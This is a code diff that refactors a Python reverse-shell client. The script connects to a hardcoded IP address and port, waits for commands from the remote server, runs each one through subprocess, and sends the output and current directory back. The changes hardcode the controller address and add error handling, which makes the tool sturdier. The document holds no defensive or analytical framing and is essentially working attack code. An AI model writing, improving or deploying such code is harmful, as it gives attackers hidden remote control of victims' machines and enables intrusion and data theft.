@@ -3,48 +3,57 @@ import os
 import subprocess
 import sys
 
-server_host = sys.argv(1)
+server_host = "192.168.1.100"
 server_port = 5003
-
-# 128kb is the max size of messages and relatively easy to increas based on your choice
-buffer_size = 1024 *128
-
-# separator string for sending two messages at a go
+buffer_size = 1024 * 128
 separator = "<sep>"
 
-# create the socket object
-s = socket.socket()
-# connect to the server
-s.connect((server_host, server_port))
+# Create the socket object with error handling
+try:
+    s = socket.socket()
+    s.connect((server_host, server_port))
+except socket.error as e:
+    print(f"Error connecting to the server: {e}")
+    sys.exit()
 
-# get the current directory
+# Get the current directory
 cwd = os.getcwd()
 s.send(cwd.encode())
 
 while True:
-    # receive the command from the server
-    command = s.recv(buffer_size).decode()
+    try:
+        # Receive the command from the server
+        command = s.recv(buffer_size).decode()
+    except socket.error as e:
+        print(f"Error receiving data: {e}")
+        break
+
     splited_command = command.split()
     if command.lower() == "exit":
-        # if the command is exit, just break out of the loop
+        # If the command is exit, break out of the loop
         break
     if splited_command[0].lower() == "cd":
-        # cd command, change directory
+        # Change directory
         try:
             os.chdir(' '.join(splited_command[1:]))
         except FileNotFoundError as e:
-            # if there is an error, set as the output
             output = str(e)
         else:
-            # if operation is successful, empty message
             output = ""
     else:
-        # execute the command and retrieve the results
+        # Execute the command and retrieve the results
         output = subprocess.getoutput(command)
-    # get the current working directory as output
+
+    # Get the current working directory
     cwd = os.getcwd()
-    # send the results back to the server
+
+    # Send the results back to the server
     message = f"{output}{separator}{cwd}"
-    s.send(message.encode())
-# close client connection
+    try:
+        s.send(message.encode())
+    except socket.error as e:
+        print(f"Error sending data: {e}")
+        break
+
+# Close client connection
 s.close()
